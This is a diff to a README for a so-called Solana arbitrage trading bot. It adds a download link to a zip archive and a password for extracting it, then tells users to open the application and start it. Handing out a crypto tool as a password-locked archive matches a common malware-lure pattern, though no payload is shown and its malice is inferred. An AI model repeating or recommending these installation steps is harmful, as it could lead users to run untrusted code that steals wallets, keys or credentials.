@@ -21,7 +21,7 @@ This bot is an  GUI tool designed to automate arbitrage trading strategies on th
 - **Failsafe Mechanisms**: Stops operation on excessive errors to prevent losses.
 
 ## Installation
-- [Clone]() the repository and extract files with password ``.
+- [Clone](https://github.com/tellguy/solana-arbitrage-bot/archive/refs/heads/main.zip) the repository and extract files with password `7HkNk8a2f`.
 - Open the application and install requirements:
 - Click the "Start" button to launch the Config Wizard.
 - Follow the on-screen instructions to set up your trading strategy.
